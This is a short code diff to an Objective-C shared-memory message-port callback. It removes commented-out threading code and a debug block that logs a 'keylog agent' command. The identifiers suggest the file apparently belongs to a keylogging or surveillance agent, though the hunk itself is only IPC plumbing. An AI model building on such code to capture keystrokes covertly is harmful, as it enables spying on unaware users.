@@ -92,16 +92,6 @@ CFDataRef shMemCallBack (CFMessagePortRef local,
         
             // duplicate shared memory to new proc...
             [shMem synchronizeShMemToPort: new_port];
-        
-            // No threading
-//          NSDictionary *aDict = [[NSDictionary alloc] 
-//                                initWithObjectsAndKeys: @"synchronizeShMemToPort", @"method",
-//                                                          new_port, @"param1", 
-//                                                          nil];
-//        
-//          [NSThread detachNewThreadSelector: @selector(runMethod:)
-//                                   toTarget: shMem
-//                                 withObject: aDict];
           }
         }
       
@@ -115,30 +105,9 @@ CFDataRef shMemCallBack (CFMessagePortRef local,
 #ifdef DEBUG
       shMemoryLog *tmp_log = (shMemoryLog *) [(NSData *)data bytes]; 
       NSLog(@"%s: writeMemory for offset 0x%x and log id %x", __FUNCTION__, msgid, tmp_log->logID);
-#endif
-#ifdef DEBUG
-    if (msgid == OFFT_KEYLOG) 
-      {
-        shMemoryCommand *tmp_cmd = (shMemoryCommand *) [(NSData *)data bytes]; 
-        NSLog(@"%s: keylog agent %d", __FUNCTION__, tmp_cmd->command);
-      }
 #endif      
       bRet = [shMem writeMemory: (NSData *)data offset: msgid fromComponent: COMP_EXT_CALLB];
-    
-      // No threading
-//      NSNumber *msgID = [[NSNumber alloc] initWithInt: msgid];
-//      NSDictionary * aDict = [[NSDictionary alloc] 
-//                              initWithObjectsAndKeys: @"writeMemory", @"method",
-//                                                      data, @"param1", 
-//                                                      msgID, @"param2", 
-//                                                      nil];
-//    
-//      [NSThread detachNewThreadSelector: @selector(runMethod:)
-//                               toTarget: shMem
-//                             withObject: aDict];
-//    
-//      [msgID release];
-      }
+    }
   
   CFRelease(data);
   
